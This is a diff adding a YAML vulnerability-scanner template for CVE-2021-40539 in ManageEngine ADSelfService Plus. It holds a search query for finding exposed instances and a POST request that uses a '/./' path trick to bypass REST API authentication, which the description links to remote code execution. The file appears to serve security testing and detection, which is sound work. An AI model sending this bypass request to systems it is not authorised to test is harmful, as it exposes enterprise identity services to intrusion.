@@ -1,0 +1,23 @@
+name: ADSelfService Plus RCE CVE-2021-40539
+manual: true
+query: (title="ManageEngine - ADSelfService Plus" | app="ZOHO-ManageEngine-ADSelfService"
+  | title=="ADSelfService Plus" | body="ADSelfService Plus")
+transport: http
+rules:
+  r0:
+    request:
+      method: POST
+      path: /./RestAPI/LogonCustomization
+      headers:
+        Content-Type: application/x-www-form-urlencoded
+      body: methodToCall=previewMobLogo
+    expression: response.status == 200 && response.body.bcontains(b"var d = new Date();")
+      && response.body.bcontains(b"window.parent.$(\"#tabLogo\")")
+expression: r0()
+detail:
+  author: aetkrad
+  links:
+  - https://forum.butian.net/share/876
+  description: Zoho ManageEngine ADSelfService Plus 6113版本及更早版本存在授权问题漏洞，该漏洞源于软件很容易绕过REST
+    API认证，从而导致远程代码执行
+  tags: rce,unauth
